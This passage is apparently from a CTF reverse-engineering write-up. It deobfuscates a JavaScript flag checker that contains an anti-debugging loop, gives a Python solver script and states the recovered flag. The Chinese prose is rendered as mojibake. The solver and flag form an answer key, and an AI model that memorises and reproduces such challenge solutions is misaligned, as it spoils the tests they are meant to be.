class="string">&#x27;seed&#x27;</span>]/<span class="number">0x38f40</span>;<span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9+_0xee8b23*(_0x56fb11-_0x14b0c9))&#125;;<span class="keyword">var</span> _0xe5731c=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>);<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0x51eb06[<span class="string">&#x27;length&#x27;</span>];_0x28db6c+=<span class="number">0x2</span></span>)</span>&#123;tmp=_H4H4H4(_0x51eb06[_0x28db6c],_0x28db6c)^_0x28db6c,_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp),randNum=<span class="built_in">Math</span>[<span class="string">&#x27;seededRandom&#x27;</span>](<span class="number">0x0</span>,<span class="number">0x100</span>),<span class="built_in">Math</span>[<span class="string">&#x27;seed&#x27;</span>]=randNum,tmp=_H4H4H4H4(tmp^_0x51eb06[_0x28db6c+<span class="number">0x1</span>],Hur1k[<span class="string">&#x27;charCodeAt&#x27;</span>]([_0x28db6c/<span class="number">0x2</span>%Hur1k[<span class="string">&#x27;length&#x27;</span>]]),randNum),_0xcaf3caf3[<span class="string">&#x27;push&#x27;</span>](tmp)&#125;((<span class="function">()=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>)</span>&#123;<span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span>![]&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)[<span class="string">&#x27;call&#x27;</span>]())&#125;,<span class="number">0x32</span>)&#125;<span class="keyword">try</span>&#123;_0x139d2b()&#125;<span class="function"><span class="title">catch</span>(<span class="params">_0x536807</span>)</span>&#123;&#125;&#125;)());<span class="keyword">if</span>(_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>]!=<span class="number">0x20</span>)<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;ç©¶æé”™è¯¯çš„&#x27;</span>,![];<span class="function"><span class="title">for</span>(<span class="params"><span class="keyword">var</span> _0x28db6c=<span class="number">0x0</span>;_0x28db6c&lt;_0xcaf3caf3[<span class="string">&#x27;length&#x27;</span>];_0x28db6c++</span>)</span>&#123;<span class="keyword">if</span>(_0xcaf3caf3[_0x28db6c]!=_0xc4f3c4f3[_0x28db6c])<span class="keyword">return</span> _0x8b9e29[<span class="string">&#x27;textContent&#x27;</span>]=<span class="string">&#x27;é”™è¯¯çš„&#x27;</span>,![]&#125;<span class="keyword">return</span>!![]&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆç»è¿‡<a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator (deobfuscate.io)</a>ï¼Œåˆæ­¥è§£æ··æ·†<br>å†é€šè¿‡<a href="https://deobfuscate.io/">JavaScript Deobfuscator (deobfuscate.io)</a>ï¼Œå†è§£ä¸€æ¬¡<br>ç„¶åå°±è§£ä¸åŠ¨äº†ï¼ˆä¸æ’é™¤æœ‰å…¶ä»–å·¥å…·ï¼‰</p><p>è§£æ··æ·†çš„ç»“æœ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) </span>&#123;</span><br><span class="line">  a = _H4H4H4(_0x1b81b8, _0x2c730f);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x11e8ab &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  a = _H4H4H4(a, _H4H4H4(~_0x2c730f &amp; <span class="number">255</span>, _H4H4H4([], <span class="number">1</span>)) &amp; <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">_0x51eb06</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> _0x8b9e29 = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  _0xcaf3caf3 = [];</span><br><span class="line">  _0xc4f3c4f3 = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.length != <span class="number">39</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (_0x51eb06[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _0x114514 = _0x51eb06.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  _0x51eb06 = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x114514.length; _0x28db6c++) &#123;</span><br><span class="line">    _0x51eb06.push(_0x114514.charCodeAt(_0x28db6c));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">_0x14b0c9, _0x56fb11</span>) </span>&#123;</span><br><span class="line">    _0x56fb11 = _0x56fb11 || <span class="number">1</span>;</span><br><span class="line">    _0x14b0c9 = _0x14b0c9 || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> _0xee8b23 = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(_0x14b0c9 + _0xee8b23 * (_0x56fb11 - _0x14b0c9));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0x51eb06.length; _0x28db6c += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = _H4H4H4(_0x51eb06[_0x28db6c], _0x28db6c) ^ _0x28db6c;</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = _H4H4H4H4(tmp ^ _0x51eb06[_0x28db6c + <span class="number">1</span>], Hur1k.charCodeAt([_0x28db6c / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    _0xcaf3caf3.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (_0xcaf3caf3.length != <span class="number">32</span>) &#123;</span><br><span class="line">    _0x8b9e29.textContent = <span class="string">&quot;ç©¶æé”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> _0x28db6c = <span class="number">0</span>; _0x28db6c &lt; _0xcaf3caf3.length; _0x28db6c++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (_0xcaf3caf3[_0x28db6c] != _0xc4f3c4f3[_0x28db6c]) &#123;</span><br><span class="line">      _0x8b9e29.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ‰‹åŠ¨è§£</p><ul><li>ä»ç›®æ ‡æ•°ç»„å…¥æ‰‹å›æº¯</li><li>æŸ¥çœ‹å¯¹ç›®æ ‡æ•°ç»„æ“ä½œçš„å‡½æ•°ï¼Œå°è¯•é€†å‘</li><li>é€†å‘ä¸å‡ºæ¥æ€ä¹ˆåŠï¼ŒæŠŠå‡½æ•°å¤åˆ¶åˆ°æ§åˆ¶å°ï¼Œä¼ å…¥ç®€å•çš„å‚æ•°ï¼Œç„¶åé€ä¸ªä¿®æ”¹å‚æ•°ï¼Œè§‚å¯Ÿå‡½æ•°è¾“å‡º</li><li>æ ¹æ®è¿™ä¸ªæ–¹æ³•å¯ä»¥æ¨æµ‹å‡º<code>_H4H4H4</code>çš„å®é™…ä½œç”¨æ˜¯ç›¸åŠ ï¼Œ<code>_H4H4H4H4</code>çš„å®é™…åŠŸèƒ½æ˜¯å‰ä¸¤ä¸ªå‚æ•°ç›¸å‡ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ‘†è®¾</li><li>æ¶‰åŠåˆ°éšæœºæ•°çš„å‚æ•°å¤§æ¦‚ç‡æ²¡ä»€ä¹ˆç”¨</li></ul><p>æœ€åæ‰‹åŠ¨è§£æ··æ·†çš„ç»“æœ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    _0x139d2b();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">_0x431cb1, _0x516603</span>) </span>&#123;</span><br><span class="line">  ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>;</span><br><span class="line">  <span class="keyword">return</span> ~((~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span> | ~(_0x431cb1 + _0x516603) &amp; <span class="number">255</span>) &amp; <span class="number">255</span>) &amp; <span class="number">255</span> &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">h_a, h_b, h_c</span>) </span>&#123;</span><br><span class="line">  a = h_a + h_c + (((~h_b &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>) + (((~h_c &amp; <span class="number">255</span>) + <span class="number">1</span>)&amp;<span class="number">255</span>)</span><br><span class="line">  a = h_a + h_c + <span class="number">256</span>-h_b + <span class="number">256</span>-h_c</span><br><span class="line">  a = <span class="number">512</span> + h_a - h_b</span><br><span class="line">  <span class="comment">// a = add(h_a, h_c);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_b &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="comment">// a = add(a, add(~h_c &amp; 255, 1) &amp; 255);</span></span><br><span class="line">  <span class="keyword">return</span> a &amp; <span class="number">255</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_G00D</span>(<span class="params">userinput</span>) </span>&#123;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">var</span> pass_err = <span class="built_in">document</span>.getElementById(<span class="string">&quot;passwordError&quot;</span>);</span><br><span class="line">  userin = [];</span><br><span class="line">  target = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>];</span><br><span class="line">  Hur1k = <span class="string">&quot;Hur1k&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (userinput.length != <span class="number">39</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput.substr(<span class="number">0</span>, <span class="number">6</span>) != <span class="string">&quot;XSCTF&#123;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (userinput[<span class="number">38</span>] != <span class="string">&quot;&#125;&quot;</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  in_slice = userinput.substr(<span class="number">6</span>, <span class="number">32</span>);</span><br><span class="line">  userinput = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; in_slice.length; i++) &#123;</span><br><span class="line">    userinput.push(in_slice.charCodeAt(i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Math</span>.seed = (<span class="keyword">new</span> <span class="built_in">Date</span>).getTime();</span><br><span class="line">  <span class="built_in">Math</span>.seededRandom = <span class="function"><span class="keyword">function</span> (<span class="params">p_a, p_b</span>) </span>&#123;</span><br><span class="line">    p_b = p_b || <span class="number">1</span>;</span><br><span class="line">    p_a = p_a || <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">Math</span>.seed = (<span class="built_in">Math</span>.seed * <span class="number">9301</span> + <span class="number">49297</span>) % <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">var</span> p_seed = <span class="built_in">Math</span>.seed / <span class="number">233280</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(p_a + p_seed * (p_b - p_a));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userinput.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">    tmp = add(userinput[i], i) ^ i;</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">    randNum = <span class="built_in">Math</span>.seededRandom(<span class="number">0</span>, <span class="number">256</span>);</span><br><span class="line">    <span class="built_in">Math</span>.seed = randNum;</span><br><span class="line">    tmp = sub(tmp ^ userinput[i + <span class="number">1</span>], Hur1k.charCodeAt([i / <span class="number">2</span> % Hur1k.length]), randNum);</span><br><span class="line">    userin.push(tmp);</span><br><span class="line">  &#125;</span><br><span class="line">  (<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_0x139d2b</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;.constructor(<span class="string">&quot;debugger&quot;</span>).call());</span><br><span class="line">      &#125;, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      _0x139d2b();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x536807) &#123;&#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">  <span class="keyword">if</span> (userin.length != <span class="number">32</span>) &#123;</span><br><span class="line">    pass_err.textContent = <span class="string">&quot;ç©¶æé”™è¯¯çš„&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; userin.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (userin[i] != target[i]) &#123;</span><br><span class="line">      pass_err.textContent = <span class="string">&quot;é”™è¯¯çš„&quot;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Hur1k = <span class="string">&quot;Hur1k&quot;</span></span><br><span class="line">s = [<span class="number">85</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">188</span>, <span class="number">51</span>, <span class="number">149</span>, <span class="number">49</span>, <span class="number">76</span>, <span class="number">137</span>, <span class="number">107</span>, <span class="number">73</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">223</span>, <span class="number">99</span>, <span class="number">229</span>, <span class="number">87</span>, <span class="number">215</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">110</span>, <span class="number">211</span>, <span class="number">99</span>, <span class="number">161</span>, <span class="number">146</span>, <span class="number">91</span>, <span class="number">114</span>, <span class="number">230</span>, <span class="number">143</span>, <span class="number">118</span>, <span class="number">79</span>, <span class="number">208</span>]</span><br><span class="line">charCode = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>, <span class="number">-1</span>, <span class="number">-2</span>):</span><br><span class="line">    s[i+<span class="number">1</span>] = ((s[i+<span class="number">1</span>]+<span class="built_in">ord</span>(Hur1k[charCode[i]]))&amp;<span class="number">255</span>)^s[i]</span><br><span class="line">    s[i] = (s[i]^i)-i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    print(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>UR_R341Ly_900d_47_Obfu_ur_Newn3W</code></p><p>ä¸€äº›è§£æ··æ·†çš„ç½‘ç«™</p><ul><li><a 